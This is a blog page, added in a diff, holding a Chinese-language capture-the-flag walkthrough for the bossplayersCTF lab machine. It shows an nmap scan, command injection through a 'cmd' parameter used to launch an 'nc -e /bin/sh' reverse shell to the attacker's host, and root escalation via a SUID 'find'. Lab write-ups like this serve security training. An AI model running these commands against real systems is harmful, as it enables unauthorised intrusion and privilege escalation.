@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    bossplayersCTF |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-azq0ps" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      bossplayersCTF
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/06/08/azq0ps/" class="article-date">
+  <time datetime="2020-06-07T23:52:58.000Z" itemprop="datePublished">2020-06-08</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>扫不到 IP 问题：<br>可以参考之前的文章：</p>
+<p>改了之后就扫到了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591574739083-1259d69e-c26f-499d-8413-5609270cdeba.png#align=left&display=inline&height=114&margin=%5Bobject%20Object%5D&name=image.png&originHeight=154&originWidth=779&size=44135&status=done&style=none&width=568" alt="image.png"></p>
+<p>nmap -p- -A 192.168.149.173 扫描一下端口</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591574784385-136cf246-5b13-4a33-bd2b-332a31a69577.png#align=left&display=inline&height=392&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1022&size=138440&status=done&style=none&width=677" alt="image.png"></p>
+<p>查看网页源码，最下面有个 base64，解出来看看</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575004358-27fba04c-a500-4618-b1ac-8e366508647d.png#align=left&display=inline&height=45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=50&originWidth=697&size=4031&status=done&style=stroke&width=617" alt="image.png"></p>
+<p>解了 3 次，解出来个 workinginprogress.php</p>
+<p>访问一下，看着这个页面莫名其妙的感觉应该有命令执行…试了一下…这…</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575211272-5539210e-6028-4f1a-97c6-fdb0aaaeee89.png#align=left&display=inline&height=502&margin=%5Bobject%20Object%5D&name=image.png&originHeight=697&originWidth=622&size=47414&status=done&style=stroke&width=447" alt="image.png"></p>
+<p>kali 上面监听一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575376624-40872441-22b5-4c6b-9689-0ff4c5a6bad7.png#align=left&display=inline&height=65&margin=%5Bobject%20Object%5D&name=image.png&originHeight=67&originWidth=281&size=7074&status=done&style=none&width=262" alt="image.png"></p>
+<p>访问一下：<br><a href="http://192.168.149.173/workinginprogress.php?cmd=nc" target="_blank" rel="noopener">http://192.168.149.173/workinginprogress.php?cmd=nc</a> -e /bin/sh 192.168.149.141 6666</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591575441105-4762bc50-cbf0-4039-aac4-c3339fa20291.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=236&originWidth=683&size=35188&status=done&style=none&width=562" alt="image.png"></p>
+<p>python -c “import pty;pty.spawn(‘/bin/bash’)” 打开一个交互 shell</p>
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>看一下哪一些程序用 root 权限运行的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591576098070-cd26aef5-8371-426f-be20-b8145e182a88.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=image.png&originHeight=341&originWidth=851&size=58674&status=done&style=none&width=588" alt="image.png"></p>
+<p>find . -exec /bin/sh -p ; -quit</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1591576337707-62127f02-8f31-4a2f-8c9d-4ed30fb85788.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=795&size=54045&status=done&style=none&width=582" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/06/08/azq0ps/" data-id="ckco53qb800018ou91q0m0nux" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/06/14/cwqnag/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            Hackme CTF
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/06/04/nsmgp5/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">PWN入门（Off-By-One）</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
